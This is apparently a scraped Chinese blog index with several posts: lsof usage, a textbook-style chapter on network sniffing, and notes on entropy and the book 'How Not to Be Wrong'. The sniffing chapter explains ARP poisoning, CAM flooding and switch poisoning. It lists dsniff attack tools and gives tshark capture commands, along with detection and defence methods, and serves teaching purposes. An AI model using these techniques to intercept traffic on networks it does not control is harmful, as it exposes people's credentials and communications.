进程名，如 chrome -g gid -p pid -a and 的意思，满足多个条件过滤 -i 端口号 还有几个就不列举了，对一般用户来说并不常用。一次命令的执行，程序会吐出这些信息： ➜ blogsys ✗ lsof -i :4001 COMMAND PID USER FD TYPE NODE NAME Google 57881 barretlee 113u IPv4 TCP localhost:52445-\u003elocalhost:newoak (ESTABLISHED) node 68004 barretlee 11u IPv6 TCP *:newoak (LISTEN) node 68004 barretlee 18u IPv6 TCP localhost:newoak-\u003elocalhost:52445 (ESTABLISHED) 中间还有一个 DEVICE 和 SIZE，被我删掉了。从上面可以看到包含如下信息： COMMAND 对应我们上面提到的 -c PID 对应 -p USER 对应 -u NAME 被打开文件的名字 FD、TYPE、NODE 就不细说了，可以看下面两篇参考文章 通过前面的参数，可以筛选被打开的文件。 ","date":"2021-12-03","objectID":"/zh-cn/3/:0:1","tags":["UNIX"],"title":"unix下的文件操纵","uri":"/zh-cn/3/"},{"categories":["UNIX"],"content":"关闭开启的端口 通过 lsof 的端口查找参数找到 pid 或者 command： lsof -i :4001 比如我们找到的 command 是 node， pid 为 73220，则可以通过下面的方式关闭端口： kill -p 73220 pkill node 另外还有 killall、xkill 等命令，可以阅读 4 Ways to Kill a Process – kill, killall, pkill, xkil ","date":"2021-12-03","objectID":"/zh-cn/3/:0:2","tags":["UNIX"],"title":"unix下的文件操纵","uri":"/zh-cn/3/"},{"categories":["UNIX"],"content":"参考文章 linux lsof详解 linux 系统监控、诊断工具之 lsof 用法简介 4 Ways to Kill a Process – kill, killall, pkill, xkil ","date":"2021-12-03","objectID":"/zh-cn/3/:0:3","tags":["UNIX"],"title":"unix下的文件操纵","uri":"/zh-cn/3/"},{"categories":["网络监听"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 网络监听 重点内容： 网络监听原理 网络监听工具 网络监听的检测和防范 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:0:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.1 网络监听原理 网络监听技术可以监视获取网络的状态、数据流动情况以及网络中传输的信息等，使得网络管理人员可以用监听技术来进行网络管理、排除网络故障。但同时，监听技术也为网络安全带来了极大的隐患。实际上，许多入侵活动都基于网络监听技术，从而导致了密码口令被非法获取、敏感信息泄露被截等安全事件的发生。 作为网络安全中十分重要的技术之一，网络监听可分为被动监听和主动监听。下面我们便来对此进行进一步学习。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:1:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.1.1 被动监听 4.1.1.1 共享式网络环境 以太网是目前应用最广泛的局域网，而 IEEE 802.3 以太局域网采用广播机制，即局域网上的所有主机共享相同的通信链路。而数据的接发实际上是由网卡来完成，每个网卡都有一个唯一的 MAC 地址作为标识。网卡工作于数据链路层，当收到数据包时，会对数据包的目的 MAC 地址进行检查，并根据网卡驱动的设置对数据包进行过滤，判断是接收还是丢弃。以太网卡的工作模式有两种：正常模式和混杂模式。在正常模式下，只接收目的 MAC 地址的自己的数据包，其他将一律丢弃；而在混杂模式下，网卡并不检查目的 MAC 地址，对所有的数据包都来者不拒。 由此可见，网络监听所需的条件为：1. 网络上的数据能够到达监听主机。2. 监听主机的网卡设置为混杂模式。在共享网络环境下，网络数据能够到达同一网段的所有主机，被动监听正是利用这一特点：嗅探者在运行时将网卡设置为混杂模式，这样不用做其他工作，就可以隐蔽的捕获分析数据而不被发现。原理如图 4-1 所示： 图 4-1 被动监听示意图 主机A发送数据包给主机B，由于是共享网络环境，采用广播模式，数据包被广而告（传送）之局域网内所有在线主机，而主机B和主机C因为网卡设置为正常模式，所以经过对目的 MAC 地址的检查，只有主机B接收到数据包，这时，若嗅探者将网卡设置为混杂模式便可接收到A发送给B的数据包（混杂模式下，不对 MAC 地址做检查）。则嗅探成功！ 这种形式是一种完全被动的嗅探，并且很难发现嗅探者。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:1:1","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.1.2 主动监听 4.1.2.1 交换式网络环境 随着交换机的广泛应用，更多的以太网属于交换类型。所有主机连接到交换机，对于发给某个特定主机的数据包会被交换机从特定的端口送出，而不是广播给网络中的所有主机。这种传输形式使得以太网的性能大大提高，但是也破坏了监听的第一条件，即其他的主机即使将网卡设置在混杂模式，也只能收到广播帧和目的地址是本机的帧，因而无法进行监听，但这并不意味着交换式网络环境就没有被嗅探的可能——使用主动监听就可以达到在交换式网络环境嗅探的目的。 交换机能够只将数据包发送给目标主机，这是因为交换机拥有内容可寻址存储器（Content Addressable Memory, CAM）表，表中存储有局域网内每台计算机的 MAC 地址和 MAC 地址所连接的交换机端口号。则交换机通过查找 CAM 表来进行数据包的转发，这样数据包便会被转发至特定的目标主机，而不是进行广播，使得嗅探难以进行。如图 4-2 所示： 图 4-2 交换式网络环境被动监听失败示意图 对于交换式的网络环境，可以采用主动监听方式，即数据链路层的漏洞利用，ARP 欺骗来进行嗅探。 首先，我们先来复习一下地址解析协议（Address Resolution Protocol, ARP）。为了避免不必要的 ARP 报文查询，每台主机都维护有一个 ARP 高速缓存，它记录着同一链路上其他主机的 IP 地址到 MAC 地址的映射关系，ARP 便是用来进行主机在发送帧前将目标 IP 地址转换为目标 MAC 地址的协议。ARP 高速缓存表可以进行动态学习（当目标主机不在表中，发送一个广播 ARP 请求包，收到答复后将地址添加到表中并进行发送数据帧）和静态配置（该缓存可以手动添加静态条目）。局域网的主机间通信需依赖于 ARP 来找到目标主机，而局域网中的主机访问外网也需依赖于 ARP 来找到网关。 还有无故地址解析协议（Gratuitous ARP, GARP）。GARP 用来检查重复地址或 IP 地址冲突，当一台机器收到一个含有与自身 MAC 地址相对应的源 IP 地址的 ARP 请求包时，便可获知存在重复地址或 IP 地址冲突。同时还可以用于通告一个新的数据链路标识，当一个设备收到一个 ARP 请求时，发现 ARP 缓冲区中已有发送者的 IP 地址，则更新此 IP 地址的 MAC 地址条目。如图 4-3 所示： 图 4-3 无故 ARP 原理示意图 关于 ARP 欺骗有三种模式： 终端 ARP 缓存投毒，即主动嗅探/中间人攻击； 交换机 DoS，强制交换机进入 Hub 模式：广播； 交换机投毒，主动“污染”交换机的 MAC-Port 转发表，即 CAM 表。 终端 ARP 缓存投毒 这种攻击利用 ARP 欺骗来嗅探主机间的通信，这需要提前知道通信双方的 MAC 地址。ARP 欺骗的发生来源于无故 ARP，ARP 缓存中毒的原理是：嗅探者向目标主机的 ARP 缓存投毒，来将自己的电脑添加到目标主机和源主机的数据转发链路之中一个节点来截获数据包。使嗅探者类似于一个代理。如图 4-4 所示： 图 4-4 终端 ARP 缓存投毒示意图 如图主机A和主机C进行通信，主机A发送广播 ARP 请求，这时，嗅探者抢先进行应答，发送伪造的无故 ARP 向主机A作出相应，其中源主机 IP 地址是主机 CIP 的，但源 MAC 地址是嗅探者的 MAC 地址，当主机A接收到应答后，在 ARP 高速缓存中添加新纪录，信息则先发给嗅探者，嗅探成功，再由嗅探者转发给主机C，或者截获后停止发送。 交换机 DoS 这种攻击也就是对 CAM 进行泛洪攻击。CAM 表中存储有 MAC 地址和交换机端口，以及他们的 VLAN 信息，CAM 表有固定的容量，只能存储一定数目的条目，而攻击者让网络中大量涌入含有不同源 MAC 地址的伪造的无故 ARP 数据包，逼迫交换机退化为集线器，如同共享式网络，只能进行广播，嗅探变得轻而易举。如图 4-5 所示： 图 4-5 交换机 DoS 原理示意图 交换机投毒 利用 MAC 的泛洪攻击来嗅探两台主机间的通信，需得知目标主机的 MAC 地址，来通过「投毒」方式「篡改」目标主机 MAC 地址在交换机 CAM 表中对应的端口号。交换机通过对每个端口发来的数据包的源 MAC 地址进行 学习 并绑定到各个端口，这时攻击者发送伪造的无故 ARP 包覆盖 CAM 表中目标主机 MAC 地址对应的交换机端口号，这样后续交换机在查询 CAM 表转发数据时会将目标 MAC 地址为被攻击者的数据包从攻击者主机所连接的交换机端口上转发出去，发送到了攻击者主机，嗅探则成功。 如图 4-6 所示，攻击开始，嗅探者不断向交换机发送伪造的无故 ARP，其中源 MAC 地址是目标主机的 MAC 地址，因为交换机绑定 MAC 地址到一个单一的端口，如果攻击者够快，用于目标主机的数据包将被发送到攻击者的交换机端口，而不是目标主机。这时，攻击者已经窃取到目标主机的交换端口，并截获信息。 图 4-6 交换机 MAC 泛洪攻击原理示意图 如图 4-7 所示，接下来，攻击者执行 ARP 请求要求目标主机的 IP 地址。当攻击者收到答复，则意味着该目标主机的交换机端口已回复到原来的约束。攻击者完成嗅探，并将数据包转发给所述的目标主机。 图 4-7 交换机端口复原原理示意图 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:1:2","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.2 网络监听工具 网络监听工具有：被动监听软件 Wireshark，主动监听软件 dsniff 和 ettercap。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:2:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.2.1 Wireshark 简介 Wireshark 是网络包分析工具，前身是 Ethereal，主要用来捕获网络包，并尝试显示包的尽可能详细的情况。可以把网络包分析工具当成是一种用来测量有什么东西从网线上进出的测量工具，就好像使电工用来测量进入电信的电量的电度表一样（当然比那个更高级）。过去的此类工具要么是过于昂贵，要么是属于某人私有，或者是二者兼顾。 Wireshark 出现以后，这种现状得以改变。Wireshark 可能算得上是今天能使用的最好的开源网络分析软件。 下面是 Wireshark 一些应用的举例：网络管理员用来解决网络问题、网络安全工程师用来检测安全隐患、开发人员用来测试协议执行情况、用来学习网络协议。具有以下特性： 多平台支持：Win / Mac / *nix。 可实时捕获网络数据包。 可详细显示数据包的协议信息。 能读取/保存数据包。 支持基于规则的数据包/协议统计分析。 支持多种方式过滤捕获/显示网络数据包。 能导入/导出其他网络嗅探程序支持的数据包格式。 有多种方式来查找包。下图为 Wireshark 的界面展示。 图 4-8 Wireshark 主界面 如图 4.8 所示，Wireshark 主窗口由如下部分组成： 菜单，用于开始操作。 主工具栏，提供快速访问菜单中经常用到的项目的功能。 Fiter toolbar/ 过滤工具栏，提供处理当前显示过滤得方法。 Packet List 面板，显示打开文件的每个包的摘要。点击面板中的单独条目，包的其他情况将会显示在另外两个面板中。 Packet detail 面板，显示您在 Packet list 面板中选择的包德更多详情。Packet bytes 面板，显示您在 Packet list 面板选择的包的数据，以及在 Packet details 面板高亮显示的字段。 状态栏，显示当前程序状态以及捕捉数据的更多详情。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:2:1","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.2.2 Wireshark 功能和使用 tshark 是 Wireshark 的终端版本（无图形用户界面），Wireshark 常用命令有： 捕获指定 IP 地址相关的数据包并保存到文件 sudo tshark -f \"host \u003cip-address\u003e\" -w \u003coutput-file.pcap\u003e 获取当前系统上所有可捕获的网卡 ID sudo tshark -D 指定数据包捕获所使用的网卡 sudo tshark –I \u003ccapture interface\u003e Wireshark 具有强大的功能，例如： 大流量数据捕获优化，Wireshark 并非实时更新报文窗口，并支持文件切割保存。禁用 MAC 地址/域名/协议类型反向解析，而且它可以自定义数据包的捕获终结条件，可按报文大小、个数、捕获时间来进行设定。 自定义过滤规则，在 wireshark 中，数据包捕获时的过滤规则可根据需要自定义设置，使得大流量数据捕获得以优化。同时还可以自定义的有报文显示时的过滤条件，可对协议分析进行辅助。 网络状况分析，可按协议分类报文的速度、丢包率/重传报文数/畸形包数量以及 TCP QoS 参数（RTT/ 带宽/时序图）来分析网络质量。 一键导出防火墙规则，—Cisco IOS / iptables /windows firewall / IPFirewall。 Wireshark 是协议分析神器，可进行 TCP/UDP 会话跟踪(Follow TCP/UDP Stream)； VoIP 协议分析，可对信令/语音数据自动识别和提取； 对应用层负载数据关键词检索，二进制/十六进制/文本皆可； 一键导出并保存应用层负载为文本/二进制原始数据/十六进制 /C 语言数组。 报文统计规律，按报文长度/按协议分层会话/自定义报文显示来进行过滤。 下面举例介绍常用报文捕获过滤规则： 只捕获 IP 地址为 172.18.5.4 的相关报文：host 172.18.5.4 只捕获指定网段的相关报文：net 192.168.0.0/24 只捕获特定端口流量：port 53 or port 80 只捕获指定端口范围的 TCP 报文：tcp portrange 1501-1549 还有报文显示过滤规则: 只显示 SMTP 和 ICMP 相关报文：tcp.port eq 25 or icmp 只匹配显示 UDP 报文头部或负载的连续 3 字节值为 0x81, 0x60, 0x03： udp contains 81:60:03 应用层正则式匹配查找： sip.To contains “^a1762$\"， http.request.uri matches “^id=[\\d]*\" ","date":"2021-12-02","objectID":"/zh-cn/2-1/:2:2","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.2.3 dsniff 简介 dsniff 是一系列密码嗅探和网络流量分析工具，用来解析不同的应用协议并提取相关信息，是网络安全审计和渗透测试工具集： arpspoof 指定目标的 arp 欺骗重定向 dnsspoof 伪造 DNS 响应消息 dsniff 口令嗅探 filesnarf NFS 文件流截获 dump macof 泛洪攻击交换机 mailsnarf 截获 SMTP 和 POP 协议邮件正⽂并 dump 为 Berkeley mbox 格式 msgsnarf 即时通信消息截获 sshmitm 针对 Open SSH V1 的 SSH 中间⼈攻击 sshow SSH 流量分析⼯具 tcpkill 强行终止局域网中的 TCP 连接 tcpnice 强⾏降速局域网中的 TCP 连接 urlsnarf 嗅探局域网中的所有 HTTP 连接请求 webmitm 针对 HTTP/HTTPS 的局域网中间人攻击 webspy 将嗅探到的 HTTP 流量发送到本地浏览器实时查看 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:2:3","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.3 网络监听的监测 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:3:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.3.1 检测共享式网络环境中的监听者 如上文提到，在共享式网络的环境下，网络监听所需的条件为： 网络上的数据能够到达监听主机。 监听主机的网卡设置为混杂模式。故而共享式网络中我们只需要检测是否存在混杂模式的网卡来探寻是否有监听者。 由于在正常模式下，主机只接收目的 MAC 地址是自己的数据包，其他将一律丢弃；而在混杂模式下，网卡并不检查目的 MAC 地址，对所有的数据包都来者不拒。所以，我们只需要构造并发送一个：疑似待排查为混杂模式目标主机的 IP 目的地址和与其真实 MAC 地址不同的虚假 MAC 目的地址 ICMP 回显请求（echo request）数据包，如果收到应答，则说明该被排查的目标主机网卡当前正工作于混杂模式，即当前网络中可能存在监听者。如图 4-9 所示： 图 4-9 检测共享式网络环境中的监听者示意图 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:3:1","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.3.2 检测交换式网络环境中的监听者 回顾前文，关于交换式网络环境的监听，主要采用主动监听方式，即数据链路层的漏洞利用，ARP 欺骗来进行嗅探。而 ARP 欺骗分为三种模式： 终端 ARP 缓存投毒，即主动嗅探/中间人攻击。 交换机 DoS，强制交换机进入 Hub 模式：广播。 交换机投毒，主动“污染”交换机的 MAC-Port 转发表，即 CAM 表。 下面我们便针对这三种监听方式如何进行检测来一一进行讲解。 4.3.2.1 检测终端 ARP 缓存投毒者 检测终端用户的 ARP 缓存表 首先发送一个 ARP 广播包，这样 ARP 缓存表中便包括了所有在线的主机 IP 到 MAC 地址的映射，随后再发送一个非广播 ARP，接着查看当前 ARP 缓存表，检查两表是否一致，若有异常则说明存在监听。其中arp -a命令用来查看当前 ARP 缓存表。如图 4-10 所示： 图 4-10 检测终端用户的 ARP 缓存表示意图 参见「检测共享式网络环境中的监听者」一节提到的 ARP 请求构造方法来检测目标主机的网卡是否工作在混杂模式，进而推断监听可能性大小。 4.3.2.2 检测交换机 DoS 攻击 对于交换机 DoS 攻击的检测，可以使用网络抓包的方法进行分析。启用交换机的端口镜像，重点关注链路通信质量参数：丢包率和重传率，以及未知的 MAC 地址。即往怀疑有网络监听行为的网络发送大量不存在的物理地址的包，由于监听程序需要分析和处理这些数据包，会占用大量的 CPU 资源，这将导致机器性能下降。而正常系统的反应时间不会有什么变化。 通过比较该机器前后的性能(icmp echo delay 等方法)来加以判断。 4.3.2.3 检测交换机投毒者 观察交换机 CMA 表中的异常更新记录，观察是否存在同一个 MAC 地址反复被映射到不同物理端口。 另外，由于大部分的网络监听软件都会进行地址反向解析，如果怀疑有网络监听，则可以在 DNS 系统上看到有没有明显增多的解析请求。 除去以上方法，也可以利用一些工具软件来发现网络监听更为方便快捷，如 AntiSniffer 等软件。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:3:2","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.4 网络监听的防范 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:4:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.4.1 终端用户的防范措施 作为一般用户我们可以安装桌面 ARP 防火墙，用来防护终端 ARP 投毒。 配置静态 ARP 地址列表，绑定网关 IP 与 MAC 地址，命令如下： arp –s \u003c网关 IP\u003e \u003c网关 MAC\u003e 最后便是对于敏感数据应该进行加密后再传输并使用加密通信协议。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:4:1","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.4.2 网络管理员的防范措施 划分 VLAN 虚拟局域网（Virtual Local Area Network, VLAN）技术的运用可以将以太网通信变为点到点通信，从而防止大部分基于网络监听的入侵。 启用并正确配置交换机的安全机制 将交换机物理端口和 MAC 地址静态绑定，限制交换机单个物理端口可以动态绑定的 MAC 地址数量。 部署内网安全监控设备 监视异常的网络情况，例如：丢包、重传、畸形包、广播风暴等异常情况。 ","date":"2021-12-02","objectID":"/zh-cn/2-1/:4:2","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["网络监听"],"content":"4.5 习题 总结⼀下在交换式局域网环境中的网络攻防之术有哪些？ 如何理解“仅仅使用 VLAN 划分的⽅法是⽆法彻底解决 ARP 欺骗与攻击”问题？ .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"highline\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Video/\", pic: \"\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-12-02","objectID":"/zh-cn/2-1/:5:0","tags":["网络监听"],"title":"网络监听","uri":"/zh-cn/2-1/"},{"categories":["机器学习"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 机器学习基础知识：熵，交叉熵，相对熵 ","date":"2021-12-02","objectID":"/zh-cn/2/:0:0","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["机器学习"],"content":"简介 信息熵是随机数据源产生信息的均量。信息熵代表的是随机变量或整个系统的不确定性，熵越大，随机变量或系统的不确定性就越大。 ","date":"2021-12-02","objectID":"/zh-cn/2/:0:1","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["机器学习"],"content":"计算 一枚正常硬币进行若干次抛投，这个事件的熵是1bit，因为结果不外乎两个 - 正面或反面，可以表示为0，1编码，而且两个结果彼此之间相互独立。但如果一枚硬币的两面完全相同，那抛硬币事件的熵为零，因为结果能被准确预测。 ","date":"2021-12-02","objectID":"/zh-cn/2/:0:2","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["机器学习"],"content":"定义 信息熵的数学公式如下： 其中 P 为X的概率质量函数，E为期望函数，而I(x)是X的信息量。I(X)本身是个随机变数。当取自有限样本时，熵的公式可以表示为： 所以熵的本质是香农信息量 log(1/p)的期望；一个事件结果的出现概率越低，对其编码的bit长度就越长。以期望在整个随机事件的无数次重复试验中，用最少的bit去记录整个实验历史，即无法压缩的表达，代表了真正的信息量。 ","date":"2021-12-02","objectID":"/zh-cn/2/:0:3","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["机器学习"],"content":"交叉熵 一个系统有一个真实的概率分布，也叫真实分布，根据真实分布，我们能够找到一个最优策略，以最小的代价消除系统的不确定性，而这个代价大小就是信息熵。 多数情况下，我们并不知道系统的真实分布，如抛硬币例子，如果硬币两面一样，但我们不知道这一信息，以为两面不一样，两面不一样是一个非真实分布。交叉熵，是用来衡量在给定的真实分布下，使用非真实分布所指定的策略消除系统的不确定性所需要付出的努力大小。 交叉熵的公式为： 其中p为真实分布，q为非真实分布。交叉熵越低，意味着q越接近p。所以在机器学习分类算法中，我们总是最小化交叉熵，交叉熵越低，间接证明算法推算出的非真实分布q越接近真实分布p。 深度学习中交叉熵损失函数[Cross Entropy Loss]； ","date":"2021-12-02","objectID":"/zh-cn/2/:0:4","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["机器学习"],"content":"相对熵（KL散度） 相对熵又称KL散度，是为了衡量不同策略之间的差异，即： 假设f(x)为真实分布p，g(x)为非真实分布q，则上述相对熵为： ","date":"2021-12-02","objectID":"/zh-cn/2/:0:5","tags":["机器学习"],"title":"机器学习基础知识：熵，交叉熵，相对熵","uri":"/zh-cn/2/"},{"categories":["数学"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 《魔鬼数学》是一本关于如何使用数学思维来分析生活中一些常见问题的书，英文原名为《How Not to Be Wrong》，即本书中包含的数学思维可帮助读者避免一些错误。 下面是一些我读过之后的一些笔记以及感想。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:0:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"日常练习的意义 这本书的引言部分提了一个问题，即日常做各类数学题有什么意义？ 相信大多数人当初在学校时都思考过这个问题，每天做不完的题，除了把人训练成解题机器之外，真的有意义吗？ 作者使用了体育训练的例子来回答这个问题，比如想踢好足球，达到职业水准，就必须接受大量枯燥、重复、看似无意义的训练，比如举杠铃、在交通锥之间穿梭前进。职业运动员在比赛中不会用到这些训练内容，但是他们所表现出来的高超的力量、速度、观察力、柔韧性等能力，则是这些枯燥乏味的训练的结果。 学数学以及其他任何一门学科也是类似，每日刷题等练习看似枯燥且无用，但这和职业运动员每日做基础的体能、反应训练的逻辑是一样的，如果你真的想在这个领域成为专家，这样的训练必不可少。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:1:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"非线性 A 国在讨论是否要提高福利，有人反对，理由是以高福利著称的 B 国最近正在削减福利，如果提高福利是好事，那 B 国为什么要削减福利呢？ 这个反对意见的问题在于，提出者认为福利与国家的繁荣程度是线性关系，如下图： 如果现实真的是这样，那么的确如反对意见所说，越是降低福利，国家的繁荣程度就会越高。然而现实世界中大多数事物之间并不是线性关系，繁荣程度与福利水平的真实关系更可能类似下图这样： 可以看到，繁荣程度-福利水平关系是一条上凸的曲线，A、B 两国分别位于峰值的两边，此时对 B 国来说削减福利能提升繁荣程度，但对 A 国来说却相反，增加福利才是最佳选择。 因此，在一个非线性的世界，我们不能不加思考地照搬人家的经验，不能因为其他人做了某个选择取得了成功，就认为我们照着做也能成功，因为世界不是线性的，我们所处的位置不一样，努力的方向就可能也不一样。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:2:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"小概率事件 有一个著名的小故事，讲的是一位股票经纪人每周给一批人发送行业资讯，一半的人收到的消息是某只股票将会涨，另一半人收到的则是那只股票会跌，下一周则不再理会收到错误预测的那一半人，继续给另一半人发新的预测资讯。这样几次之后，总有一小部分人惊讶地发现这位经纪人每次都能说对，于是对他言听计从，此时，股票经纪人就会开始收网，劝说这些人买入他指定的股票，从而大赚一笔，当然，最终赚钱的永远是股票经纪人自己。 只要这位股票经纪人一开始联系的人足够多，总有一部分“幸运儿”会发现自己遇到了一位神奇的预测大师，但站在股票经纪人的角度来看，这一切其实一点也不稀奇。 我们生活中可能会遇到很多类似的事，只是有一些做了若干包装或者改进，让人不那么容易看出真相。比如基金公司可能会同时孵化多支基金，尝试无数种投资策略，只要孵化的数量足够多，这些基金中必然会有一些能在过去一段时间的市场中表现良好，然后基金公司就将其推出，向公众兜售。作为投资者，你看到某个基金过往的业绩如此耀眼，你是否会心动呢？ 不排除有一些投资策略的确比另一些更有可能赚钱，但孵化大量基金并推出其中表现良好那些的做法，本质上与上面股票经纪人的做法是一样的。这些最终胜出的基金，有可能只是运气好，没有人能保证它们在今后的市场中还能有这样的好运气。 有一些研究者曾声称在圣经等典籍中发现了隐藏的密码，比如只要每隔多少个字符取一个字母，就能拼出后世某位名人的名字以及他的生卒年月等信息，这也是一种类似的把戏。从长篇巨著中寻找字母有无数有找法，只要你尝试得足够多，你总能从中找到一些看起来有意义的组合，而另外无数种无意义或错误的组合自然而然地被你忽略了。 甚至，一些看似经过严格科学分析的结论也有可能受到随机性的影响，比如下面这幅漫画所描写的。 假设豆胶糖与痤疮没有关系，但只要科学家们做的试验次数足够多，总会遇到某些随机因素使实验者得到二者有关的结论，甚至可能还会具体到认为豆胶糖的颜色是主要原因，比如“吃绿色的豆胶糖与得痤疮之间有关系”。即使试验次数很少，比如只做了一次试验，也有可能因为随机性刚好得到两者相关的结论。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:3:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"回归 很多事物都有回归均值的倾向，比如整体来看，子女成年后的身高与他们的父母相比更加趋于平均水平。 这样的例子还有很多，比如父母都很高，生的孩子并不是必然也高，有可能比父母矮一些，智力水平也一样，一对名校夫妇的子女可能无法像父母一样杰出。 又比如一个公司曾经非常赚钱，但后来却慢慢平庸，一位作家写出了惊艳的作品，下一部作品却反响平平，一个球队上一个赛季表现优异，下一个赛季却辉煌不再。 这些情况，也许并不是当事人取得一次成功之后就不再努力了，而是因为之前的优异表现是随机产生的，现在相关的指标只是回归到了均值水平而已。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:4:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"相关性 如果 A 与 B 相关，B 与 C 相关，那么 A 与 C 相关吗？ 这个问题即问相关性有没有传递性，按多数人的直觉，答案大概是肯定的，既然 A 与 B 相关，B 与 C 相关，那似乎很自然地 A 与 C 也是相关的。 这儿我们不深究“相关”一词的定义，只需大致知道这是一个统计学上的概念，默认是指正相关，即如果说 A 与 B 相关，则表示当观察到事件 A 发生时，我们相信事件 B 会有更大的概率发生，同时需要注意，相关关系并不是因果关系。 书中指出，如果我们把某个事件的相关数字看作坐标，则一个事件可以看成为某个高维空间中的点，从原点出发画一个箭头指向这个点，这个箭头被称为“向量”。 这样一来，我们就把事件转为了高维空间的向量，并且可以很快得出一些关于相关性的几何意义的结论。从几何上来说，相关性就是两个向量夹角的余弦。两个向量间的夹角越小，说明它们的相关性越大，夹角越接近 90 度，则表示两个事件越不相关，夹角刚好为 90 度时我们认为这两个事件是独立事件，夹角大于 90 度时则认为这两个事件是负相关，即两个事件不太可能同时发生。 这是一个理解相关性的极佳的视角。 此时，我们再来看一下最初的问题，如果 A、B、C 三个事件的关系如下图所示： 为简便起见，我们假设三个向量是在同一个平面中。可以看到，事件 A 与 B 之间的夹角小于 90 